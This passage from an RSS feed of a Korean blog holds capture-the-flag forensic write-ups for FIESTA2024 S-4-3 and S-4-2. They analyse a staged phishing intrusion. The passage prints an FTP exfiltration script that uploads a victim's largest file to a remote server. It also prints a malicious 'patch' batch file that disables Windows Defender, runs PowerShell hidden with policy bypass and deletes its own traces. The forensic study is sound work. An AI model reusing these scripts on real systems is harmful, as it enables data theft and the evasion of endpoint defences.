    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server_ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$biggest_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ftp_initialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ftp_initialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Net.NetworkCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ftp_initialize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UploadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target_fileName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\kusti\Desktop\Work&lt;/code&gt; 디렉토리에 있는 가장 큰 파일을 원격지 서버에 업로드한다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;mark&gt;위 악성행위가 수행된 시점에, 위 디렉토리에 있던 가장 큰 파일은 무엇이었을까?&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;사실은… 해당 디렉토리를 보면 파일이 그렇게 많지 않다.&lt;/p&gt;

&lt;p&gt;따라서 파일의 MD5SUM 값을 다 구해서 일일이 넣어보면 문제는 풀린다.&lt;/p&gt;

&lt;p&gt;그러나 좀 더 근거를 가지고 접근하고 싶으니 더 생각해보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;처음부터 다시 한 번 동작을 짚어보겠다.&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;피해자는 악성 배치 파일을 실행했다.&lt;/li&gt;
  &lt;li&gt;실행된 악성 배치 파일은 함께 있던 악성 파일 powershell.ps1 파일을 실행했다.&lt;/li&gt;
  &lt;li&gt;powershell.ps1 파일은 함께 있던 Guide.idb 파일을 디코딩해 악성 커맨드를 뽑았고, 실행했다.&lt;/li&gt;
  &lt;li&gt;실행된 악성 커맨드는 원격지 서버에서 파일을 다운받고, 7-zip 유틸리티를 이용해 백그라운드로 압축 해제 및 실행하도록 했다.&lt;/li&gt;
  &lt;li&gt;그렇게 드롭된 system.ps1 파일은 class.ps1 파일을 실행했다.&lt;/li&gt;
  &lt;li&gt;class.ps1 파일은 리버스 쉘로, mpev.ps1을 피해자 컴퓨터에 write했다.&lt;/li&gt;
  &lt;li&gt;mpev.ps1 파일은 실행 시점에 상기 디렉토리에 있는 가장 큰 파일을 ftp 를 이용해 원격지 서버에 업로드했다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;파워쉘 스크립트가 핵심적으로 사용됐으므로 침해당한 컴퓨터의 PowerShell 로그를 확인할 것이다.&lt;/p&gt;

&lt;p&gt;3번~4번에서 넘어가는 시점에 파워쉘은 파이프라인 IO를 활용해 커맨드를 실행했을 것이다.&lt;/p&gt;

&lt;p&gt;즉, 800번 이벤트가 반드시 발생했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이벤트 ID 순으로 파워쉘 로그를 정렬해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%203.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;24.08.10 오후 5:12:49&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;7번의 행위는 반드시 저 시점 이후에 발생한다.&lt;/p&gt;

&lt;p&gt;따라서, 저 시점을 기준으로 mpev.ps1 문자열을 포함하는 이벤트를 전부 검색했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%204.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(위 사진은 찾을 내용 다 찾아봤을 때, 저 시점이 mpev.ps1의 가장 최초 실행 시점임을 뜻한다)&lt;/p&gt;

&lt;p&gt;그 결과, 아래와 같이 정리할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;이벤트 ID 403, 파워쉘 중지(powershell.ps1과 mpev.ps1), 24.08.10 오후 5:19:33&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%205.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%206.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이벤트 ID 600, 파워쉘 코드 실행(mpev.ps1), 24.08.10 오후 5:19:32&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%207.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, &lt;mark&gt;24.08.10 오후 5:19:33 이전에 해당 디렉토리에 있던 파일 중 가장 큰 것이 유출되었다&lt;/mark&gt;는 결론이 나온다.&lt;/p&gt;

&lt;p&gt;해당 디렉토리에 있던 파일을 추출해서 크기 내림차순으로 정렬 후 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%208.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;pdoc.png 파일이 조건에 부합하는 파일 중 가장 큰 것으로 확인되었다.&lt;/p&gt;

&lt;p&gt;해당 파일의 MD5SUM 값을 CyberChef로 구해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image%209.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-3/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 플래그는 다음과 같다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIESTA{75C1AB24F0B76C54AA76F464F66E72CA}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 28 Jan 2025 09:00:02 -0600</pubDate>
        <link>https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3</guid>
      </item>
    
      <item>
        <title>FIESTA2024 S-4-2 풀이</title>
        <description>
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;문제&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;피해자가 다운로드 받은 파일명과 hidden 형식으로 실행된 파일은?
(flag 형식 : 다운받은 파일-실행된 파일)&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 실력이 부족해서 첫번째 문제를 못 푼거고&lt;/p&gt;

&lt;p&gt;그래서 뒤 문제도 다 못푼 건 맞는데&lt;/p&gt;

&lt;p&gt;아니 생각하면 생각할수록 (실체없이) 억울하네&lt;/p&gt;

&lt;p&gt;진짜로 1번 문제 정답 빼고 털 수 있는 건 다 털어서 더 억울함&lt;/p&gt;

&lt;p&gt;박탈감….아아…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 ‘피해자가’ 다운로드 받은 파일명과 그 파일을 실행함으로써 hidden 형식으로 실행된 파일을 묻는 것이며, 따라서 (시나리오의 설명을 참고하면) 어떤 메일을 열어서 무엇이 실행되었는지 찾아야 하는 문제로 보인다.&lt;/p&gt;

&lt;p&gt;그리고 그거 이미 S-4-1에서 풀었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/7ca383b9-13a9-41e0-9991-844913e93b3b.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;피해자는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patch_guide.zip&lt;/code&gt; 파일을 다운받았다.&lt;/p&gt;

&lt;p&gt;해당 파일 내부에는 아래와 같은 파일이 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/image.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-2/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;patch.bat 파일의 내용은 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nul&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorLevel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;neq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;This&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;requires&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;administrative&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;privileges.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Please&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;an&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;administrator.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/b&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DisableAntiSpyware&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;REG_DWORD&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DisableRealtimeMonitoring&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;REG_DWORD&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Patch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinDefend&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Patch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading.........&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WinDefend&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading...............&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring,DisableAntiSpyware&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Patch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Loading.....................&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;~dp0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoProfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WindowStyle&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Hidden&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-File&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%~dp0powershell.ps1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;downloadPath=%USERPROFILE%\Downloads&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exist&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;del&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide.zip&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exist&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/s&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/q&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%downloadPath%\patch_guide&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;맨 밑에 Hidden 형식으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell.ps1&lt;/code&gt;이 실행된 게 보인다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 플래그는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIESTA{patch_guide.zip-powershell.ps1}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
